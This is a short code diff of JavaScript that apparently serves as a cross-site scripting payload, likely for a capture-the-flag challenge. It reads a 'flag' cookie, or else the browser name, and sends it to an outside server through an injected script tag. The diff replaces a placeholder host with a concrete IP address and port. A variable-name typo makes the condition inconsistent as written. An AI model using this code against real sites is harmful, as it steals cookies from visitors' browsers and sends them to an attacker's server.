@@ -19,10 +19,10 @@ var BrowserName=browser+b_version;
 if(BroswerName == 'Mozilla/Secret VIP1.0') {
     var flag=getCookie('flag');
     var script=document.createElement('script');
-    script.src='http://test.com/index.php?flag='+flag;
+    script.src='http://119.29.81.170:7892/?flag='+flag;
     document.body.appendChild(script);
 } else {
     var script=document.createElement('script');
-    script.src='http://test.com/index.php?broswer='+BrowserName;
+    script.src='http://119.29.81.170:7892/?broswer='+BrowserName;
     document.body.appendChild(script);
 }
